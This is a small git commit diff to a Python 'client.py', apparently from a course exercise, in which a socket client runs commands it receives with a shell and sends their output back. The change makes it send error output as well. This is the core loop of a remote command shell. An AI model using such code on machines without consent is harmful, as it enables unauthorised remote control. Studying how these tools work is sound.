8bcd7a4f2d08933843f1678527b42045bfabd314
augusto-takashi <75028872+augusto-takashi@users.noreply.github.com>
2020-11-26 17:42:45 -0300

    Update client.py

--- 11/client.py
+++ 11/client.py
@@ -13,7 +13,7 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     print(command)
     op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
     output = op.stdout.read()
-    #output_error = op.stderr.read()
-    #s.send(output + output_error)
-    s.send(output)
+    output_error = op.stderr.read()
+    s.send(output + output_error)
+
   
